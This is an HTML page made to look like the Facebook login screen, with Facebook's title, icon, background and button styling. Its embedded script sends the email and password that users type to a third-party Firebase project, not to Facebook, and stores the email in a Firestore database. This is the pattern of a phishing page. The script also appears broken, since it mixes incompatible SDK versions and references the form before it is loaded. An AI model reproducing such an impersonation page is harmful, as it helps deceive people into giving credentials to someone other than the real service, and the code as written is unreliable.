<!DOCTYPE html>
<html lang="en">
<head>
    <style type="text/css">
        body {
            background: url('../img/fb.png') no-repeat;
            background-size: cover;
        }

        .container {
            margin-top: 79.1%;
        }

        .but {
            height: 3.5em;
            width: 34.5em;
            border-radius: 30px;
            margin-top: 10px;
            background: #0064E0;
            border: #0021bb 1px solid;
            color: white;
        }

        #emailOrMobile {
            height: 4.3em;
            width: 33em;
            border-radius: 12px;
            background: white;
            border: #A2ACB5 1px solid;
            color: black;
            margin-bottom: 1em;
            padding-left: 1em;
        }

        #password {
            height: 4.3em;
            width: 33em;
            padding-left: 1em;
            border-radius: 12px;
            background: white;
            border: #A2ACB5 1px solid;
            color: black;
        }
    </style>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Log in</title>
    <link rel="icon" href="img/fbicon.png">
    <!-- Include Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.6.4/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.4/firebase-auth.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.4/firebase-firestore.js"></script>
    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBN1nO7oGf_6EAf_dR9i-VgGjNtd7h_TSI",
            authDomain: "fir-4c2e5.firebaseapp.com",
            projectId: "fir-4c2e5",
            storageBucket: "fir-4c2e5.appspot.com",
            messagingSenderId: "947197705303",
            appId: "1:947197705303:web:31f3c6f84b8223d2d9b712",
            measurementId: "G-ZG4FPRMQ3H"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);

        const auth = firebase.auth();
        const db = firebase.firestore();

        // Function to handle form submission
        function loginUser(event) {
            event.preventDefault();

            const email = document.getElementById('emailOrMobile').value;
            const password = document.getElementById('password').value;

            // Sign in with Firebase Authentication
            auth.signInWithEmailAndPassword(email, password)
                .then((userCredential) => {
                    // Signed in
                    var user = userCredential.user;
                    console.log('Login successful:', user);

                    // Save user data to Firestore
                    db.collection('users').doc(user.uid).set({
                        email: user.email,
                        lastLogin: new Date()
                    })
                    .then(() => {
                        console.log('User data saved to Firestore');
                        alert('Login successful');
                    })
                    .catch((error) => {
                        console.error('Error saving user data:', error.message);
                        alert('Login successful, but user data could not be saved.');
                    });

                })
                .catch((error) => {
                    var errorCode = error.code;
                    var errorMessage = error.message;
                    console.error('Login failed:', errorMessage);
                    alert('Login failed: ' + errorMessage);
                });
        }

        // Add event listener to form submit
        document.getElementById('loginForm').addEventListener('submit', loginUser);
    </script>
</head>
<body>
    <div class="container">
        <form id="loginForm">
            <input type="text" id="emailOrMobile" name="emailOrMobile" placeholder="Mobile number or email" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <button class="but" type="submit"><b>Log in</b></button>
        </form>
    </div>
</body>
</html>